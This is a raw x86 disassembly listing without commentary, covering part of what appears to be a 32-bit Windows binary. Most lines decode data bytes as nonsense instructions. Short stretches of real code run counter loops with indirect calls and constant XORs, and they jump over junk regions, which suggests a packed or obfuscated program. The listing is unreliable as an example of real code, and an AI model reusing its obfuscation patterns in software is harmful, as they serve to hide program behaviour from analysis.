  40e5a3:	add    dh,bh
  40e5a5:	and    BYTE PTR [edi-0x13],al
  40e5a8:	xchg   esp,eax
  40e5a9:	add    BYTE PTR [ecx+0x60],0x8a
  40e5ad:	sbb    cl,bl
  40e5af:	out    dx,al
  40e5b0:	sub    esp,DWORD PTR [edx+0x7]
  40e5b3:	push   esi
  40e5b4:	daa    
  40e5b5:	and    ebx,DWORD PTR [ebx+0x6e]
  40e5b8:	sbb    ch,dl
  40e5ba:	ja     0x40e581
  40e5bc:	and    BYTE PTR [ecx-0x237d4147],dl
  40e5c2:	push   esp
  40e5c3:	sub    al,BYTE PTR [ebx+0x7d065a82]
  40e5c9:	pop    esp
  40e5ca:	jp     0x40e55c
  40e5cc:	or     al,0x1b
  40e5ce:	mov    esi,0xd4329156
  40e5d3:	sbb    ah,0xd9
  40e5d6:	inc    edx
  40e5d7:	mov    ebp,0x5f8ecb44
  40e5dc:	mov    dl,0x62
  40e5de:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e5e0:	daa    
  40e5e1:	jp     0x40e614
  40e5e3:	dec    edi
  40e5e4:	cmp    eax,0x8826bd2d
  40e5e9:	add    eax,edi
  40e5eb:	mov    ds:0xb041b6a1,al
  40e5f0:	in     al,dx
  40e5f1:	push   edi
  40e5f2:	loopne 0x40e66a
  40e5f4:	mov    esp,0x202d0bf5
  40e5f9:	cmp    dh,ah
  40e5fb:	retf   
  40e5fc:	clc    
  40e5fd:	loope  0x40e59b
  40e5ff:	or     bl,bh
  40e601:	adc    al,0xfb
  40e603:	in     eax,dx
  40e604:	fbstp  TBYTE PTR [edi+ecx*1+0x7603478b]
  40e60b:	push   ss
  40e60c:	push   ss
  40e60d:	or     DWORD PTR [ecx+0x45],ebp
  40e610:	dec    ebx
  40e611:	mov    edx,DWORD PTR [esi-0x57]
  40e614:	test   DWORD PTR [edx],ebp
  40e616:	ss mov ebx,0x100ab20b
  40e61c:	mov    bh,0xf8
  40e61e:	dec    eax
  40e61f:	shld   DWORD PTR [edx],ebp,0x10
  40e623:	cld    
  40e624:	jo     0x40e67f
  40e626:	(bad)
  40e62a:	pushf  
  40e62b:	pop    ss
  40e62c:	leave  
  40e62d:	fadd   QWORD PTR [edx+ecx*1]
  40e630:	and    DWORD PTR [ebx+0x5c2c63ab],edi
  40e636:	out    dx,eax
  40e637:	(bad)  
  40e638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e63a:	mov    ecx,0xa6387365
  40e63f:	mov    al,ds:0xc9526a97
  40e644:	pop    ebx
  40e645:	(bad)  
  40e646:	pop    ss
  40e647:	add    ah,BYTE PTR [ebx+0x2525c785]
  40e64d:	hlt    
  40e64e:	in     eax,0xf7
  40e650:	cwde   
  40e651:	push   ebp
  40e652:	test   al,0x25
  40e654:	push   0xfffffff0
  40e656:	mov    cl,0x76
  40e658:	addr16 call 0xb637e419
  40e65e:	cdq    
  40e65f:	lods   eax,DWORD PTR ds:[esi]
  40e660:	dec    ebp
  40e661:	ins    DWORD PTR es:[edi],dx
  40e662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e663:	sti    
  40e664:	cmp    DWORD PTR [eax],0x6961dee1
  40e66a:	retf   
  40e66b:	pushf  
  40e66c:	add    dl,BYTE PTR ds:0x3d9c6da4
  40e672:	mov    bh,0x56
  40e674:	or     DWORD PTR [ebp+0x5b],esi
  40e677:	ficomp WORD PTR [edx-0x5952e162]
  40e67d:	sbb    ah,BYTE PTR [ebx-0x22fe2d6c]
  40e683:	paddd  mm7,QWORD PTR [ebx+0x53db5d69]
  40e68a:	push   edi
  40e68b:	aaa    
  40e68c:	xor    edi,ebx
  40e68e:	xchg   ebp,eax
  40e68f:	dec    esi
  40e690:	es mov esp,0x65472eb5
  40e696:	mov    ebp,0xf108c5b0
  40e69b:	jl     0x40e6c6
  40e69d:	xchg   ecx,eax
  40e69e:	push   ss
  40e69f:	js     0x40e622
  40e6a1:	pop    ecx
  40e6a2:	mov    edx,0xe952c400
  40e6a7:	out    0x4c,eax
  40e6a9:	shl    DWORD PTR [edx],0x94
  40e6ac:	cdq    
  40e6ad:	shl    al,1
  40e6af:	jecxz  0x40e673
  40e6b1:	std    
  40e6b2:	xor    BYTE PTR [eax],0x74
  40e6b5:	mov    esi,DWORD PTR [ebx]
  40e6b7:	repz test al,0x4e
  40e6ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6bb:	retf   0x366b
  40e6be:	pop    ebp
  40e6bf:	mov    ch,BYTE PTR [edx-0x35c3b999]
  40e6c5:	mov    ch,0x11
  40e6c7:	push   es
  40e6c8:	xchg   ah,dl
  40e6ca:	and    eax,DWORD PTR [esi]
  40e6cc:	retf   0xd393
  40e6cf:	and    al,0xeb
  40e6d1:	scas   al,BYTE PTR es:[edi]
  40e6d2:	ja     0x40e6ab
  40e6d4:	ret    0x23ae
  40e6d7:	stos   BYTE PTR es:[edi],al
  40e6d8:	xchg   ecx,eax
  40e6d9:	jb     0x40e6f6
  40e6db:	sbb    esi,DWORD PTR [eax-0x71]
  40e6de:	rcl    dl,0xe3
  40e6e1:	loop   0x40e6c3
  40e6e3:	dec    ebp
  40e6e4:	jb     0x40e69d
  40e6e6:	retf   
  40e6e7:	(bad)  
  40e6e8:	dec    edi
  40e6e9:	push   esi
  40e6ea:	sub    DWORD PTR [esi+0x4c19889f],ebp
  40e6f0:	adc    DWORD PTR [ebp+0xa],eax
  40e6f3:	popa   
  40e6f4:	pop    edx
  40e6f5:	and    BYTE PTR [esi-0x1874d57b],ah
  40e6fb:	pop    ecx
  40e6fc:	adc    BYTE PTR [esi+0x33],bh
  40e6ff:	mov    BYTE PTR [ebx],0xc3
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	mov    WORD PTR [esi-0x44c000fa],cs
  40e738:	js     0x40e7b2
  40e73a:	xor    eax,0x2578787e
  40e73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e740:	outs   dx,DWORD PTR ds:[esi]
  40e741:	mov    esi,0xb7ff37d5
  40e746:	fst    DWORD PTR [esi-0x1e6a1241]
  40e74c:	call   0xe978:0x7c2cd7b1
  40e753:	xchg   DWORD PTR es:[esi],ebx
  40e756:	jnp    0x40e7c6
  40e758:	icebp  
  40e759:	lea    esi,[eax-0x10]
  40e75c:	cmp    DWORD PTR [ebp-0x16],edi
  40e75f:	add    edx,esi
  40e761:	mov    DWORD PTR [ecx+0x46a28ae5],ecx
  40e767:	mov    ds:0x4f9da26b,eax
  40e76c:	lods   eax,DWORD PTR ds:[esi]
  40e76d:	(bad)  
  40e76e:	pop    ss
  40e76f:	in     al,dx
  40e770:	pop    esp
  40e771:	add    eax,0x83f9d4be
  40e776:	xor    edi,DWORD PTR [edx+edx*2]
  40e779:	jnp    0x40e7be
  40e77b:	or     ebp,edx
  40e77d:	cli    
  40e77e:	mov    esp,ebx
  40e780:	mov    ebp,0xf8cb0af9
  40e785:	pop    edx
  40e786:	mov    bh,0x7
  40e788:	pop    eax
  40e789:	sbb    al,0x24
  40e78b:	add    DWORD PTR ds:0x10b87ff2,0x1b
  40e792:	jmp    0x7aaa9000
  40e797:	js     0x40e740
  40e799:	cmp    eax,0x7e87d4ba
  40e79e:	repz js 0x40e815
  40e7a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7a2:	jnp    0x40e78e
  40e7a4:	adc    eax,0x6e10d0fd
  40e7a9:	pop    esp
  40e7aa:	mov    WORD PTR [esi-0x5307932b],cs
  40e7b0:	push   ebp
  40e7b1:	and    DWORD PTR [eax-0x78d8d597],ebx
  40e7b7:	wrmsr  
  40e7b9:	xlat   BYTE PTR ds:[ebx]
  40e7ba:	push   cs
  40e7bb:	or     ebx,DWORD PTR [ecx]
  40e7bd:	ror    DWORD PTR [ebp+0x74924bca],1
  40e7c3:	mov    al,ds:0xc9570608
  40e7c8:	lahf   
  40e7c9:	cmp    DWORD PTR [eax+0x20a15714],eax
  40e7cf:	icebp  
  40e7d0:	lea    esi,[ebp+0x2d286bc0]
  40e7d6:	ror    BYTE PTR [edi+0x4a],0x9
  40e7da:	and    cl,BYTE PTR [eax-0x49]
  40e7dd:	cmp    al,bh
  40e7df:	pop    ebp
  40e7e0:	sub    BYTE PTR [edi+0xe],bh
  40e7e3:	mov    dh,0x4a
  40e7e5:	or     ebx,DWORD PTR [eax+0x7]
  40e7e8:	inc    esi
  40e7e9:	inc    edx
  40e7ea:	punpcklbw mm7,DWORD PTR [ebp-0x24192407]
  40e7f1:	xor    dl,bl
  40e7f3:	cmp    BYTE PTR [eax+0x7279c1f8],cl
  40e7f9:	xor    BYTE PTR [ecx],0x28
  40e7fc:	pop    es
  40e7fd:	push   esi
  40e7fe:	data16 in al,dx
  40e800:	push   ds
  40e801:	in     al,dx
  40e802:	cdq    
  40e803:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e805:	shl    DWORD PTR [edi-0x236cac9d],0x54
  40e80c:	and    ebp,eax
  40e80e:	and    al,BYTE PTR [esi]
  40e810:	ins    BYTE PTR es:[edi],dx
  40e811:	jnp    0x40e7d5
  40e813:	jmp    0x40e814
  40e815:	popf   
  40e816:	push   es
  40e817:	adc    ebx,ecx
  40e819:	ror    BYTE PTR [ebp-0x46],1
  40e81c:	stos   DWORD PTR es:[edi],eax
  40e81d:	xor    esi,ecx
  40e81f:	pop    esi
  40e820:	and    eax,0xa0ba3e77
  40e825:	mov    ds:0x8b2e4562,eax
  40e82a:	push   esi
  40e82b:	iret   
  40e82c:	mov    ds:0xe1d5d803,al
  40e831:	sbb    cl,BYTE PTR [ecx]
  40e833:	jmp    0x3866047b
  40e838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e839:	aad    0x26
  40e83b:	pop    ecx
  40e83c:	data16 jge 0x40e7d9
  40e83f:	inc    ebp
  40e840:	push   ss
  40e841:	mov    al,0xf4
  40e843:	mov    dh,BYTE PTR [eax]
  40e845:	mov    esi,0xe3ba568b
  40e84a:	lock test eax,0x392e3da6
  40e850:	adc    ecx,DWORD PTR [ecx-0xd]
  40e853:	mov    ebx,0xdcaa36c1
  40e858:	jmp    0xea1b:0xcc1c5d81
  40e85f:	std    
  40e860:	or     cl,0x30
  40e863:	repnz sar DWORD PTR [eax-0x42c848d6],0x21
  40e86b:	das    
  40e86c:	mov    cs,WORD PTR [edx+0x1b]
  40e86f:	push   ds
  40e870:	mov    al,ds:0xdbd60219
  40e875:	scas   eax,DWORD PTR es:[edi]
  40e876:	daa    
  40e877:	repnz and ah,BYTE PTR [ebp-0x7b40e073]
  40e87e:	gs mov ecx,0xde7473d5
  40e884:	cmc    
  40e885:	xchg   ebp,eax
  40e886:	int    0x2a
  40e888:	nop
  40e889:	stos   BYTE PTR es:[edi],al
  40e88a:	dec    ebp
  40e88b:	dec    edi
  40e88c:	xor    esi,0x83df3c03
  40e892:	inc    ebx
  40e893:	bnd ret 
  40e895:	sub    ebx,edx
  40e897:	popa   
  40e898:	jecxz  0x40e887
  40e89a:	inc    edi
  40e89b:	mov    ah,0x4
  40e89d:	pop    edi
  40e89e:	in     eax,0x25
  40e8a0:	mov    cl,0xd4
  40e8a2:	popf   
  40e8a3:	push   ecx
  40e8a4:	pop    ebx
  40e8a5:	or     cl,BYTE PTR [edi-0x5888d156]
  40e8ab:	mov    ebp,0x4b372ec0
  40e8b0:	test   DWORD PTR [ecx],esp
  40e8b2:	add    DWORD PTR [eax],esi
  40e8b4:	ret    
  40e8b5:	dec    esi
  40e8b6:	jle    0x40e853
  40e8b8:	sahf   
  40e8b9:	add    eax,0x2ef493d6
  40e8be:	fwait
  40e8bf:	or     eax,0x8cc4956d
  40e8c4:	mov    eax,ds:0x492a5ce4
  40e8c9:	pop    eax
  40e8ca:	imul   DWORD PTR gs:[eax+0x18]
  40e8ce:	and    al,0x2b
  40e8d0:	cmp    edx,esi
  40e8d2:	xchg   ebp,eax
  40e8d3:	call   DWORD PTR [ecx-0x361ce065]
  40e8d9:	mov    dl,0xbc
  40e8db:	(bad)  
  40e8dc:	fdiv   st,st(3)
  40e8de:	push   edi
  40e8df:	shl    BYTE PTR [ebp+0x56],0x7a
  40e8e3:	or     eax,0x6812b713
  40e8e8:	lock push es
  40e8ea:	dec    ecx
  40e8eb:	jmp    0xc2b3fba7
  40e8f0:	mov    dh,0x67
  40e8f2:	push   ebp
  40e8f3:	cmp    eax,ecx
  40e8f5:	xchg   edi,eax
  40e8f6:	icebp  
  40e8f7:	inc    ebp
  40e8f8:	cwde   
  40e8f9:	dec    ebx
  40e8fa:	dec    eax
  40e8fb:	mov    ds:0x102bbf28,eax
  40e901:	sbb    bh,BYTE PTR [ebx-0x3c]
  40e904:	mov    dl,0x7f
  40e906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e907:	cwde   
  40e908:	add    DWORD PTR [edi+0x24ff8995],ebx
  40e90e:	outs   dx,BYTE PTR ds:[esi]
  40e90f:	jmp    0xd904f48
  40e914:	shr    DWORD PTR [ecx+0x50],0x27
  40e918:	sub    ah,BYTE PTR [edx-0x63]
  40e91b:	out    0x9c,al
  40e91d:	(bad)  
  40e91e:	loopne 0x40e96c
  40e920:	jp     0x40e8b2
  40e922:	ret    0xa4a
  40e925:	adc    DWORD PTR [edx+0x66],0xc2288465
  40e92c:	clc    
  40e92d:	push   0x7f
  40e92f:	push   ds
  40e930:	shl    BYTE PTR [edi-0x2],cl
  40e933:	out    0xc3,eax
  40e935:	dec    edx
  40e936:	push   esp
  40e937:	mov    al,ds:0x468260fc
  40e93c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e93d:	stos   BYTE PTR es:[edi],al
  40e93e:	push   ebx
  40e93f:	jle    0x40e8de
  40e941:	adc    eax,0x5bdfbe9d
  40e946:	sbb    ch,BYTE PTR [ebx]
  40e948:	pop    ss
  40e949:	mov    eax,ds:0xe8cb25c2
  40e94e:	mov    ebx,0x15cc01ac
  40e953:	nop
  40e954:	push   es
  40e955:	sbb    al,0xa2
  40e957:	sbb    al,0x5d
  40e959:	push   esp
  40e95a:	push   ebp
  40e95b:	inc    BYTE PTR [ecx]
  40e95d:	mov    cl,0x8e
  40e95f:	adc    al,0x4
  40e961:	sub    eax,0x2db96415
  40e966:	mov    al,ds:0x710db66c
  40e96b:	aas    
  40e96c:	(bad)  
  40e96d:	clc    
  40e96e:	jg     0x40e97c
  40e970:	cmp    al,0xc6
  40e972:	daa    
  40e973:	shl    bh,1
  40e975:	cmp    edx,esi
  40e977:	fwait
  40e978:	arpl   WORD PTR [ebx-0x39ccf3bb],cx
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	dec    ebx
  40ea23:	mov    eax,0xb9f43db2
  40ea28:	js     0x40eaa2
  40ea2a:	in     eax,0x7e
  40ea2c:	js     0x40eaa6
  40ea2e:	pop    edx
  40ea2f:	mov    cs,WORD PTR [eax+0x31b8b733]
  40ea35:	cdq    
  40ea36:	and    al,bl
  40ea38:	test   eax,0x38c55b9
  40ea3d:	adc    al,BYTE PTR [eax+0x4c5b452f]
  40ea43:	inc    DWORD PTR [ebp+ebp*8+0x838ed40]
  40ea4a:	scas   eax,DWORD PTR es:[edi]
  40ea4b:	jns    0x40ea13
  40ea4d:	daa    
  40ea4e:	je     0x40eaa8
  40ea50:	xchg   ebx,eax
  40ea51:	xchg   esp,eax
  40ea52:	sub    al,0xe1
  40ea54:	xor    esp,edi
  40ea56:	push   sp
  40ea58:	pusha  
  40ea59:	dec    DWORD PTR ds:0x23ad851c
  40ea5f:	xchg   esp,eax
  40ea60:	or     DWORD PTR [esi],0x78e8023
  40ea66:	push   ebp
  40ea67:	mov    ebx,DWORD PTR [esi-0x32fe3739]
  40ea6d:	push   edx
  40ea6e:	cmp    DWORD PTR [edx+0x5792c092],esp
  40ea74:	call   0x8212:0xba2de7f0
  40ea7b:	dec    edx
  40ea7c:	(bad)  
  40ea7d:	icebp  
  40ea7e:	stos   DWORD PTR es:[edi],eax
  40ea7f:	cmp    al,0x4c
  40ea81:	xchg   esi,eax
  40ea82:	cmp    dh,al
  40ea84:	fisubr DWORD PTR [esp+edi*2+0x1b]
  40ea88:	scas   eax,DWORD PTR es:[edi]
  40ea89:	xor    esi,DWORD PTR ds:0x1011d7bc
  40ea8f:	popa   
  40ea90:	or     eax,0x458d351f
  40ea95:	mov    BYTE PTR [eax-0x23],0x10
  40ea99:	fwait
  40ea9a:	cmc    
  40ea9b:	sbb    edi,esp
  40ea9d:	sub    eax,0x93cacff1
  40eaa2:	outs   dx,BYTE PTR ds:[esi]
  40eaa3:	xor    al,BYTE PTR ds:0x146c24b9
  40eaa9:	jmp    edi
  40eaab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaac:	pop    ecx
  40eaad:	je     0x40eafa
  40eaaf:	daa    
  40eab0:	lahf   
  40eab1:	fld    QWORD PTR [esi]
  40eab3:	daa    
  40eab4:	or     ebx,DWORD PTR [esi-0x6a]
  40eab7:	cmp    al,0x3b
  40eab9:	rol    BYTE PTR [eax-0x6c],1
  40eabc:	aam    0xdd
  40eabe:	dec    eax
  40eabf:	mov    ecx,0x54b31d7f
  40eac4:	out    dx,eax
  40eac5:	sbb    eax,0x40b6bded
  40eaca:	ret    0x7b83
  40eacd:	add    DWORD PTR [edx+0x1b],eax
  40ead0:	push   ecx
  40ead1:	and    eax,0xe0260c59
  40ead6:	dec    ecx
  40ead7:	and    BYTE PTR [ecx+0x2fc08f9d],dl
  40eadd:	fwait
  40eade:	gs or  eax,0xdd7f6806
  40eae4:	fldcw  WORD PTR [eax-0x7e]
  40eae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae8:	in     al,0xe7
  40eaea:	mov    ecx,0x7d038577
  40eaef:	cmp    bh,0x27
  40eaf2:	jle    0x40eb50
  40eaf4:	push   es
  40eaf5:	pop    ebx
  40eaf6:	jl     0x40eb76
  40eaf8:	ret    
  40eaf9:	aas    
  40eafa:	test   eax,0xfe009b1b
  40eaff:	jg     0x40ea89
  40eb01:	xchg   ebp,eax
  40eb02:	test   al,0x99
  40eb04:	sub    DWORD PTR [ebx+0x59],eax
  40eb07:	call   0x9290:0x8a4028be
  40eb0e:	push   DWORD PTR [ecx]
  40eb10:	popf   
  40eb11:	push   esp
  40eb12:	sti    
  40eb13:	or     eax,0x16f1ac2f
  40eb18:	ins    DWORD PTR es:[edi],dx
  40eb19:	sbb    al,0x46
  40eb1b:	mov    ecx,0xe7629dfc
  40eb20:	test   DWORD PTR [ebp+ebx*4+0x75],ebp
  40eb24:	scas   eax,DWORD PTR es:[edi]
  40eb25:	(bad)  
  40eb26:	jns    0x40eb8c
  40eb28:	jnp    0x40eb53
  40eb2a:	cmp    DWORD PTR [esp+ebp*4-0x183b23a2],esp
  40eb31:	mov    ecx,0x58334b9a
  40eb36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb37:	int3   
  40eb38:	push   esi
  40eb39:	sbb    ebx,eax
  40eb3b:	or     esp,ecx
  40eb3d:	xchg   bh,cl
  40eb3f:	loope  0x40eb51
  40eb41:	inc    eax
  40eb42:	push   ecx
  40eb43:	fnstenv [esi+0x63]
  40eb46:	cmp    BYTE PTR ds:0x9815125,dh
  40eb4c:	ficom  WORD PTR [ebx-0x71]
  40eb4f:	add    cl,BYTE PTR [edx+0x5b]
  40eb52:	loop   0x40eae3
  40eb54:	test   al,0x7e
  40eb56:	cmp    al,0xcc
  40eb58:	jle    0x40eb99
  40eb5a:	add    DWORD PTR [esi],edi
  40eb5c:	mov    ebp,0x7c0887c4
  40eb61:	loope  0x40eb9b
  40eb63:	sti    
  40eb64:	add    eax,0xd4c42a97
  40eb69:	jo     0x40ebcd
  40eb6b:	ror    DWORD PTR [esi+0x49bda0c7],cl
  40eb71:	loope  0x40eb50
  40eb73:	dec    esp
  40eb74:	inc    esi
  40eb75:	jno    0x40ebba
  40eb77:	or     ebx,edx
  40eb79:	std    
  40eb7a:	fbld   TBYTE PTR [ecx-0x7dd41d00]
  40eb80:	fwait
  40eb81:	test   DWORD PTR [ebx+ebx*8],eax
  40eb84:	pop    eax
  40eb85:	test   al,0xdb
  40eb87:	dec    esp
  40eb88:	adc    al,0x79
  40eb8a:	test   eax,0x13e4644a
  40eb8f:	or     eax,0x1ae2d695
  40eb94:	daa    
  40eb95:	jb     0x40eb69
  40eb97:	and    DWORD PTR [eax],esi
  40eb99:	cld    
  40eb9a:	and    eax,0x59d5236
  40eb9f:	frstor [edi-0x2f4cfd47]
  40eba5:	ds (bad) 
  40eba7:	mov    DWORD PTR [eax+0x2b],ebx
  40ebaa:	outs   dx,DWORD PTR ds:[esi]
  40ebab:	fiadd  DWORD PTR [ecx]
  40ebad:	je     0x40ec00
  40ebaf:	stos   BYTE PTR es:[edi],al
  40ebb0:	pushf  
  40ebb1:	sbb    eax,0xc18a5f7d
  40ebb6:	mov    esi,0xd3c50478
  40ebbb:	push   0xffffffa7
  40ebbd:	lock mul DWORD PTR [edx]
  40ebc0:	cmp    al,0x50
  40ebc2:	and    DWORD PTR [bp+di-0x6b],esi
  40ebc6:	cmp    DWORD PTR [edi-0x63f337a4],edx
  40ebcc:	sub    eax,0x720de910
  40ebd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebd2:	fisttp WORD PTR [esi+0x1d]
  40ebd5:	inc    edx
  40ebd6:	dec    edx
  40ebd7:	aad    0x9e
  40ebd9:	inc    eax
  40ebda:	mov    dl,ch
  40ebdc:	lods   al,BYTE PTR ds:[esi]
  40ebdd:	sub    bl,bh
  40ebdf:	adc    DWORD PTR [ebx+ebp*1-0x27870c52],ecx
  40ebe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe7:	inc    esi
  40ebe8:	repnz push ds
  40ebea:	sub    esp,DWORD PTR [edi+eax*2+0x3a]
  40ebee:	outs   dx,DWORD PTR ds:[esi]
  40ebef:	sbb    bl,BYTE PTR [ecx-0x48ec55f9]
  40ebf5:	fistp  QWORD PTR es:[eax]
  40ebf8:	in     eax,0xcd
  40ebfa:	xor    DWORD PTR [eax],ebp
  40ebfc:	ret    0x92fa
  40ebff:	pop    ss
  40ec00:	daa    
  40ec01:	xchg   esp,eax
  40ec02:	fisttp QWORD PTR [esi+0x0]
  40ec05:	stos   BYTE PTR es:[edi],al
  40ec06:	mov    BYTE PTR [edx],bh
  40ec08:	loop   0x40ebb1
  40ec0a:	pop    edx
  40ec0b:	das    
  40ec0c:	inc    eax
  40ec0d:	lea    eax,[ebx-0x2e]
  40ec10:	push   ss
  40ec11:	shr    DWORD PTR [edx],cl
  40ec13:	popf   
  40ec14:	sub    eax,0x19130ba3
  40ec19:	shr    BYTE PTR [eax],cl
  40ec1b:	push   cs
  40ec1c:	jno    0x40ec83
  40ec1e:	cmc    
  40ec1f:	fld    TBYTE PTR [ecx]
  40ec21:	mov    bl,0x95
  40ec23:	bound  esi,QWORD PTR [edi-0x40e3c1c5]
  40ec29:	jno    0x40ec60
  40ec2b:	into   
  40ec2c:	in     al,0x46
  40ec2e:	loop   0x40ebfb
  40ec30:	fistp  DWORD PTR [ecx+ebx*1]
  40ec33:	aam    0xa5
  40ec35:	xor    DWORD PTR [edx],esi
  40ec37:	pop    es
  40ec38:	das    
  40ec39:	xor    eax,0xfd6c0dff
  40ec3e:	pop    ebx
  40ec3f:	and    eax,0xeae6b31a
  40ec44:	fst    DWORD PTR [eax-0x118706d9]
  40ec4a:	aam    0xa7
  40ec4c:	and    dh,BYTE PTR [ebx]
  40ec4e:	push   esp
  40ec4f:	retf   
  40ec50:	and    DWORD PTR [ebx+0x6bfe2dd4],ebx
  40ec56:	adc    ebp,esp
  40ec58:	fstp   QWORD PTR [eax-0x9]
  40ec5b:	add    esp,DWORD PTR es:[edi-0x1cc00cac]
  40ec62:	sub    eax,0xd017aad8
  40ec67:	ins    DWORD PTR es:[edi],dx
  40ec68:	mov    esi,0xf2b5d287
  40ec6d:	sub    ah,BYTE PTR [eax+ebp*1]
  40ec70:	rcl    cl,cl
  40ec72:	xchg   esi,eax
  40ec73:	out    0xa1,eax
  40ec75:	push   eax
  40ec76:	rol    DWORD PTR [eax-0x1],0x27
  40ec7a:	mov    es,WORD PTR [ebx+edx*1-0x69]
  40ec7e:	dec    esp
  40ec7f:	ds mov al,0x6e
  40ec82:	clc    
  40ec83:	retf   0xdd0f
  40ec86:	mov    ah,0x8d
  40ec88:	ss mov dh,0x59
  40ec8b:	jecxz  0x40ec74
  40ec8d:	mov    edi,0x15011229
  40ec92:	daa    
  40ec93:	sub    al,0xa1
  40ec95:	adc    eax,0x8b0aac1d
  40ec9a:	push   ebp
  40ec9b:	or     BYTE PTR [ebx],cl
  40ec9d:	or     eax,0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
